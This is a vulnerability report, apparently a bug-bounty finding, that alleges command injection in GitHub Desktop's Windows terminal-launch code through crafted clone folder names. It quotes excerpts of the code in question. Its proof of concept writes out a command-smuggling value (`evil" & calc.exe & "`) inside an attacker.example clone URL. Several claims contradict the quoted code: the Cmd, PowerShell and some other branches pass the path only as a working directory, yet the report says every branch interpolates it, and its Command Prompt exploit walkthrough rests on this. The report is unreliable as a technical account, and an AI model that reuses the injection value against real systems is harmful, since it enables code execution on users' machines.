### Title
Unescaped shell metacharacters in clone-derived repository folder names lead to command injection via "Open in Shell/Terminal" - (File: `app/src/lib/shells/win32.ts`)

### Summary
GitHub Desktop derives the local clone folder name directly from the repository name segment of a (possibly attacker-controlled) git remote URL via `sanitizeCloneName()`. This function only guards against path traversal (`/`, `\`, `:` splitting, `..` rejection) — it does not strip or escape shell metacharacters such as `"`, `` ` ``, `$`, `&`, or `|`. That folder name later becomes part of the repository's local path, which Windows shell/terminal-launch commands interpolate unescaped into `shell: true` command strings.

### Finding Description
`sanitizeCloneName()` in `app/src/lib/remote-parsing.ts` is explicitly designed only as an anti-traversal guard, taking the last path component and rejecting `.`/`..`, but leaving all other characters intact: [1](#0-0) . It is used to compute the clone destination directory name from the repository name parsed out of an arbitrary git remote URL, both in the Clone dialog's directory picker and while typing a URL: [2](#0-1) [3](#0-2) .

The repository name comes from `parseRemote()`/`parseRepositoryIdentifier()`, which extracts the `name` capture group straight from the URL regex match without character restriction: [4](#0-3) . Unlike GitHub.com's own repo-name validation, a generic/self-hosted git remote URL (or a malicious `x-github-client://` clone deep link) can encode any character in that segment — including `"`, `` ` ``, `$()`, `&`, `|` — none of which are filtered by `sanitizeCloneName`.

This folder name becomes part of `Repository.path`. When the user later invokes "Open in Command Prompt / PowerShell / Git Bash / Cygwin / Hyper / Alacritty / Warp / Windows Terminal / Fluent Terminal" on that repository, `win32.ts`'s `launch()` builds the child-process command by directly interpolating that path into a double-quoted string and executing it with `shell: true`, e.g.: [5](#0-4) [6](#0-5) 

Every branch in `launch()` follows the same unescaped-quoting pattern (`` `"${path}"` `` inside a `shell: true` spawn) — Cmd, PowerShell, PowerShellCore, Hyper, Alacritty, GitBash, Cygwin, and Warp all embed `path` this way: [7](#0-6) . A `"` character in the folder name breaks out of the quoted argument on the `cmd.exe`/`START` command line (or PowerShell/other shell command lines), letting the attacker append arbitrary shell syntax that executes when the user simply opens a shell/terminal from a cloned repository — a completely ordinary Desktop workflow, requiring no special user action beyond the normal "clone → open in shell" flow.

This mirrors the H1 report's root cause exactly: attacker-controlled property/name data is embedded into a piece of "code" (there, a generated JS function; here, a shell command line) without escaping the quote/backtick characters that delimit that code, giving the attacker a break-out primitive.

### Impact Explanation
An attacker who controls a git remote URL — via a malicious repository the victim is invited to clone, or a crafted deep link/clone URL the victim clicks — can plant shell metacharacters in the repository name. Once the victim clones it through Desktop and later uses the built-in "Open in shell" feature (a routine action, not an unnatural step), arbitrary OS commands execute in the context of the logged-in user on Windows. This satisfies "attacker controls ... a git remote/proxy response ... result is code execution" from the impact criteria.

### Likelihood Explanation
Moderate-to-high: cloning arbitrary/third-party repositories and then opening a shell from Desktop are both core, everyday features. The user does not need to inspect the folder name; Desktop silently derives and creates it. The only prerequisite is that the victim clones an attacker-supplied URL and later opens a shell for that repo, both of which are expected, unprompted-natural usage patterns of the app.

### Recommendation
Reject or replace shell/filesystem-unsafe characters (quotes, backticks, `$`, `&`, `|`, and other Windows-reserved characters `<>:"|?*`) in `sanitizeCloneName()`, matching the stricter approach already used by `sanitizedRepositoryName()` (`app/src/ui/add-repository/sanitized-repository-name.ts`, which whitelists `\w.-`) [8](#0-7) . Additionally, `win32.ts`'s `launch()` should avoid `shell: true` with manually quoted string interpolation and instead pass arguments as an argv array (letting Node's `spawn` handle escaping) or use a robust quoting/escaping utility for any path embedded in a shell command line.

### Proof of Concept
1. Attacker sets up a git server (or GitHub Enterprise-style generic remote) whose repo path segment is crafted as: `evil" & calc.exe & "`.
2. Victim clones via Desktop's "Clone repository" (generic URL tab) using `https://attacker.example/owner/evil" & calc.exe & ".git`.
3. `parseRepositoryIdentifier`/`sanitizeCloneName` pass the raw `name` through unmodified (only `/`, `\`, `:` are special-cased), so the local clone folder is created as `evil" & calc.exe & "`.
4. Victim right-clicks the repository in Desktop and selects "Open in Command Prompt" (or Git Bash, etc.).
5. `launch()` builds e.g. `START "Command Prompt" "C:\...\evil" & calc.exe & ""` and spawns it with `shell: true`, causing `cmd.exe` to interpret `&` as a command separator and execute `calc.exe` (or any attacker payload) outside of the intended path string.

export function parseRemote(url: string): IGitRemoteURL | null {
  for (const { protocol, regex } of remoteRegexes) {
    const match = regex.exec(url)
    if (match !== null && match.length >= 4) {
      return { protocol, hostname: match[1], owner: match[2], name: match[3] }
    }
  }

  return null
}

export function sanitizeCloneName(name: string): string | null {
  const components = name.split(/[/\\:]/)

  let lastComponent = ''
  for (let i = components.length - 1; i >= 0; i--) {
    if (components[i].length > 0) {
      lastComponent = components[i]
      break
    }
  }

  if (lastComponent.length === 0) {
    return null
  }

  if (lastComponent.endsWith('.git')) {
    lastComponent = lastComponent.slice(0, -4)
  }

  if (
    lastComponent === '..' ||
    lastComponent === '.' ||
    lastComponent.length === 0
  ) {
    return null
  }

  return lastComponent
}

export function launch(
  foundShell: FoundShell<Shell>,
  path: string
): ChildProcess {
  const shell = foundShell.shell

  switch (shell) {
    case Shell.PowerShell:
      return spawn('START', ['"PowerShell"', `"${foundShell.path}"`], {
        shell: true,
        cwd: path,
      })
    case Shell.PowerShellCore:
      return spawn(
        'START',
        [
          '"PowerShell Core"',
          `"${foundShell.path}"`,
          '-WorkingDirectory',
          `"${path}"`,
        ],
        {
          shell: true,
          cwd: path,
        }
      )
    case Shell.Hyper:
      const hyperPath = `"${foundShell.path}"`
      log.info(`launching ${shell} at path: ${hyperPath}`)
      return spawn(hyperPath, [`"${path}"`], {
        shell: true,
        cwd: path,
      })
    case Shell.Alacritty:
      const alacrittyPath = `"${foundShell.path}"`
      log.info(`launching ${shell} at path: ${alacrittyPath}`)
      return spawn(alacrittyPath, [`--working-directory "${path}"`], {
        shell: true,
        cwd: path,
      })
    case Shell.GitBash:
      const gitBashPath = `"${foundShell.path}"`
      log.info(`launching ${shell} at path: ${gitBashPath}`)
      return spawn(gitBashPath, [`--cd="${path}"`], {
        shell: true,
        cwd: path,
      })
    case Shell.Cygwin:
      const cygwinPath = `"${foundShell.path}"`
      log.info(`launching ${shell} at path: ${cygwinPath}`)
      return spawn(
        cygwinPath,
        [`/bin/sh -lc 'cd "$(cygpath "${path}")"; exec bash`],
        {
          shell: true,
          cwd: path,
        }
      )
    case Shell.Warp:
      const warpPath = `"${foundShell.path}"`
      log.info(`launching ${shell} at path: ${warpPath}`)
      return spawn(warpPath, [`warp://action/new_tab?path="${path}"`], {
        shell: true,
        cwd: path,
      })
    case Shell.WSL:
      return spawn('START', ['"WSL"', `"${foundShell.path}"`], {
        shell: true,
        cwd: path,
      })
    case Shell.Cmd:
      return spawn(
        'START',
        ['"Command Prompt"', `"${foundShell.path}"`, ...foundShell.extraArgs!],
        {
          shell: true,
          cwd: path,
        }
      )
    case Shell.WindowsTerminal:
      const windowsTerminalPath = `"${foundShell.path}"`
      log.info(`launching ${shell} at path: ${windowsTerminalPath}`)
      return spawn(windowsTerminalPath, ['-d .'], { shell: true, cwd: path })
    case Shell.FluentTerminal:
      const fluentTerminalPath = `"${foundShell.path}"`
      log.info(`launching ${shell} at path: ${fluentTerminalPath}`)
      return spawn(fluentTerminalPath, ['new'], { shell: true, cwd: path })
    default:
      return assertNever(shell, `Unknown shell: ${shell}`)
  }
}
